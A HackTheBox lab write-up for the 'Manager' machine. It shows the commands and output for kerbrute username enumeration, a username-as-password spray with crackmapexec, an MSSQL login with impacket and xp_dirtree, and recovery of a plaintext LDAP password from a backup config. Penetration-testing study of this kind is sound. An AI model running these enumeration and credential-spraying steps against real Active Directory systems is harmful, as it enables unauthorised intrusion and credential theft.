# Explanation
After getting my initial scan results, I looked through the machine and found that there is kerberos so, I ended up scanning the machine with kerbrute to see if I can find any usernames from the machine. After finding the list of usernames, I decided to perform a basic brute force by using the username as the password. After finding the credentials, "operator:operator", I used it on mssqlclient of impacket to log into microsoft sql to look for anything interesting and I was able to find a backup zip file so I used wget to download that file. After downloading the zip file, I extracted it and found the ".old-conf.xml" and after checking out the xml file, I found raven user's username and password which I used to get initial access.

# Kerbrute
```
┌──(root㉿kali)-[~/Documents/Notes/hackthebox/Manager]
└─# /opt/Enumeration/kerbrute userenum -d manager.htb --dc 10.10.11.236 /opt/seclists/Usernames/xato-net-10-million-usernames.txt -o users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 11/21/23 - Ronnie Flathers @ropnop

2023/11/21 23:12:45 >  Using KDC(s):
2023/11/21 23:12:45 >  	10.10.11.236:88

2023/11/21 23:12:47 >  [+] VALID USERNAME:	 ryan@manager.htb
2023/11/21 23:12:50 >  [+] VALID USERNAME:	 guest@manager.htb
2023/11/21 23:12:52 >  [+] VALID USERNAME:	 cheng@manager.htb
2023/11/21 23:12:53 >  [+] VALID USERNAME:	 raven@manager.htb
2023/11/21 23:13:03 >  [+] VALID USERNAME:	 administrator@manager.htb
2023/11/21 23:13:23 >  [+] VALID USERNAME:	 Ryan@manager.htb
2023/11/21 23:13:25 >  [+] VALID USERNAME:	 Raven@manager.htb
2023/11/21 23:13:34 >  [+] VALID USERNAME:	 operator@manager.htb
2023/11/21 23:14:51 >  [+] VALID USERNAME:	 Guest@manager.htb
2023/11/21 23:14:52 >  [+] VALID USERNAME:	 Administrator@manager.htb
2023/11/21 23:16:00 >  [+] VALID USERNAME:	 Cheng@manager.htb
2023/11/21 23:19:02 >  [+] VALID USERNAME:	 jinwoo@manager.htb
2023/11/21 23:19:34 >  [+] VALID USERNAME:	 RYAN@manager.htb
2023/11/21 23:21:19 >  [+] VALID USERNAME:	 RAVEN@manager.htb
2023/11/21 23:21:24 >  [+] VALID USERNAME:	 GUEST@manager.htb
2023/11/21 23:24:25 >  [+] VALID USERNAME:	 Operator@manager.htb
2023/11/21 23:25:40 >  [+] VALID USERNAME:	 zhong@manager.htb
2023/11/21 23:28:30 >  [+] VALID USERNAME:	 chinhaw@manager.htb
```

# Users.txt
```
┌──(root㉿kali)-[~/Documents/Notes/hackthebox/Manager]
└─# cat users.txt
ryan
guest
cheng
raven
administrator
operator
jinwoo
zhong
chinhaw
```

# Crackmapexec
```
crackmapexec smb 10.10.11.236 -u users.txt -p users.txt
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:guest STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:cheng STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:raven STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:administrator STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:operator STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:jinwoo STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:zhong STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:chinhaw STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\guest:ryan STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\guest:guest STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\guest:cheng STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\guest:raven STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\guest:administrator STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\guest:operator STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\guest:jinwoo STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\guest:zhong STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\guest:chinhaw STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:ryan STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:guest STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:cheng STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:raven STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:administrator STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:operator STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:jinwoo STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:zhong STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:chinhaw STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:ryan STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:guest STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:cheng STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:raven STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:administrator STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:operator STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:jinwoo STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:zhong STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:chinhaw STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\administrator:ryan STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\administrator:guest STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\administrator:cheng STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\administrator:raven STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\administrator:administrator STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\administrator:operator STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\administrator:jinwoo STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\administrator:zhong STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\administrator:chinhaw STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\operator:ryan STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\operator:guest STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\operator:cheng STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\operator:raven STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\operator:administrator STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator 
```

# mssqlclient
```
┌──(root㉿kali)-[~/Documents/Notes/hackthebox/Manager]
└─# /opt/Active_Directory/activeD/impacket/examples/mssqlclient.py manager.htb/operator:operator@10.10.11.236 -windows-auth
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> EXEc xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1   

contact.html                          1      1   

css                                   1      0   

images                                1      0   

index.html                            1      1   

js                                    1      0   

service.html                          1      1   

web.config                            1      1   

website-backup-27-07-23-old.zip       1      1   

SQL> 
```

# extraction
```
┌──(root㉿kali)-[~/…/Notes/hackthebox/Manager/extracted]
└─# unzip website-backup-27-07-23-old.zip
Archive:  website-backup-27-07-23-old.zip
replace .old-conf.xml? [y]es, [n]o, [A]ll, [N]one, [r]ename: A
  inflating: .old-conf.xml           
  inflating: about.html              
  inflating: contact.html            
  inflating: css/bootstrap.css       
  inflating: css/responsive.css      
  inflating: css/style.css           
  inflating: css/style.css.map       
  inflating: css/style.scss          
  inflating: images/about-img.png    
  inflating: images/body_bg.jpg      
 extracting: images/call.png         
 extracting: images/call-o.png       
  inflating: images/client.jpg       
  inflating: images/contact-img.jpg  
 extracting: images/envelope.png     
 extracting: images/envelope-o.png   
  inflating: images/hero-bg.jpg      
 extracting: images/location.png     
 extracting: images/location-o.png   
 extracting: images/logo.png         
  inflating: images/menu.png         
 extracting: images/next.png         
 extracting: images/next-white.png   
  inflating: images/offer-img.jpg    
  inflating: images/prev.png         
 extracting: images/prev-white.png   
 extracting: images/quote.png        
 extracting: images/s-1.png          
 extracting: images/s-2.png          
 extracting: images/s-3.png          
 extracting: images/s-4.png          
 extracting: images/search-icon.png  
  inflating: index.html              
  inflating: js/bootstrap.js         
  inflating: js/jquery-3.4.1.min.js  
  inflating: service.html            

┌──(root㉿kali)-[~/…/Notes/hackthebox/Manager/extracted]
└─# ls -al
total 1092
drwxr-xr-x 5 root root    4096 Nov 22 00:15 .
drwxr-xr-x 5 root root    4096 Nov 22 00:11 ..
-rw-r--r-- 1 root root    5386 Jul 27 05:32 about.html
-rw-r--r-- 1 root root    5317 Jul 27 05:32 contact.html
drwxr-xr-x 2 root root    4096 Nov 22 00:15 css
drwxr-xr-x 2 root root    4096 Nov 22 00:15 images
-rw-r--r-- 1 root root   18203 Jul 27 05:32 index.html
drwxr-xr-x 2 root root    4096 Nov 22 00:15 js
-rw-r--r-- 1 root root     698 Jul 27 05:35 .old-conf.xml
-rw-r--r-- 1 root root    7900 Jul 27 05:32 service.html
-rw-r--r-- 1 root root 1045328 Nov 22 00:14 website-backup-27-07-23-old.zip

┌──(root㉿kali)-[~/…/Notes/hackthebox/Manager/extracted]
└─# cat .old-conf.xml
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
  
```